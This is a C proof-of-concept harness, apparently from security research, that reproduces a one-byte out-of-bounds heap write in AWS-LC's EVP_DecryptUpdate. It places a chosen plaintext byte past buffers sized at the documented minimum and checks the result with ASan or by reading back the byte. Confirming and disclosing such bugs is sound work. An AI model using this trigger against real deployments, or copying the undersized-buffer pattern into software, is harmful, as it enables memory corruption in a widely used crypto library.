// frontier lab: CVE-2026-134056, AWS-LC EVP_DecryptUpdate one-byte OOB write.
// Modes:
//   asan     allocate the documented minimum (in_len + block_len - 1 = 31)
//            for each 16-byte update; ASan must report a WRITE past the region.
//   byte     allocate 32 bytes (one extra), so the overflowing byte lands in
//            allocated memory; print it and compare with the chosen plaintext
//            byte used to build the ciphertext.
//   single   single 48-byte update into a 63-byte documented-minimum buffer.
//   nopad    two 16-byte updates with PKCS#7 padding disabled.
// Build the same harness against the fixed library for control runs.
#include <openssl/evp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/err.h>
#define CHOSEN 0x48 /* 'H' */

static const uint8_t kKey[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
static const uint8_t kIv[16] = {0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
                                0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f};

static int make_ciphertext(uint8_t *ct, int *ct_len, int ecb) {
  uint8_t pt[32];
  for (int i = 0; i < 32; i++) {
    pt[i] = (uint8_t)i;
  }
  pt[31] = CHOSEN;
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int n1 = 0, n2 = 0, ok = 0;
  if (ctx != NULL &&
      EVP_EncryptInit_ex(ctx, ecb ? EVP_aes_128_ecb() : EVP_aes_128_cbc(),
                         NULL, kKey, kIv) &&
      EVP_EncryptUpdate(ctx, ct, &n1, pt, 32) &&
      EVP_EncryptFinal_ex(ctx, ct + n1, &n2)) {
    *ct_len = n1 + n2;
    ok = 1;
  }
  EVP_CIPHER_CTX_free(ctx);
  return ok;
}

static int run(int mode) {
  uint8_t ct[64];
  int ct_len = 0;
  const int ecb = (mode == 5);
  if (!make_ciphertext(ct, &ct_len, ecb) || ct_len != 48) {
    fprintf(stderr, "encryption failed or unexpected ct_len=%d\n", ct_len);
    return 2;
  }

  const size_t chunk = 16;
  const size_t cap = (mode == 1 || mode == 3 || mode == 4)
                         ? 32
                         : (mode == 2 ? 63 : 31);
  uint8_t *out = malloc(cap);
  if (out == NULL) {
    return 2;
  }
  memset(out, 0xab, cap);

  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int n = 0, total = 0, ok = 0;
  int pad = (mode != 3);
  const EVP_CIPHER *cipher = ecb ? EVP_aes_128_ecb() : EVP_aes_128_cbc();
  if (ctx == NULL ||
      !EVP_DecryptInit_ex(ctx, cipher, NULL, kKey, kIv) ||
      !EVP_CIPHER_CTX_set_padding(ctx, pad)) {
    goto done;
  }

  if (mode == 2) {
    ok = EVP_DecryptUpdate(ctx, out, &n, ct, ct_len);
    total = n;
  } else {
    const size_t limit = (mode == 4) ? 32 : (size_t)ct_len;
    for (size_t off = 0; off < limit; off += chunk) {
      ok = EVP_DecryptUpdate(ctx, out, &n, ct + off, (int)chunk);
      if (!ok) {
        break;
      }
      total += n;
    }
  }
  if (ok && mode != 4) {
    uint8_t final[32];
    int fn = 0;
    ok = EVP_DecryptFinal_ex(ctx, final, &fn);
    total += fn;
    if (!ok) {
      fprintf(stderr, "final_error: %s\n",
              ERR_error_string(ERR_get_error(), NULL));
    }
  }
done:
  if (mode == 0 || mode == 5) {
    printf("mode=%d rc=%d total=%d cap=%zu (no heap read past cap)\n",
           mode, ok, total, cap);
  } else {
    printf("mode=%d rc=%d total=%d cap=%zu byte31=0x%02x chosen=0x%02x %s\n",
           mode, ok, total, cap, out[31], CHOSEN,
           out[31] == CHOSEN ? "CHOSEN_BYTE_PRESENT" : "CHOSEN_BYTE_ABSENT");
  }
  EVP_CIPHER_CTX_free(ctx);
  free(out);
  return ok ? 0 : 1;
}

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "usage: %s asan|byte|byte2|single|nopad|asan-ecb\n", argv[0]);
    return 2;
  }
  if (strcmp(argv[1], "asan") == 0) {
    return run(0);
  }
  if (strcmp(argv[1], "byte") == 0) {
    return run(1);
  }
  if (strcmp(argv[1], "single") == 0) {
    return run(2);
  }
  if (strcmp(argv[1], "nopad") == 0) {
    return run(3);
  }
  if (strcmp(argv[1], "byte2") == 0) {
    return run(4);
  }
  if (strcmp(argv[1], "asan-ecb") == 0) {
    return run(5);
  }
  return 2;
}
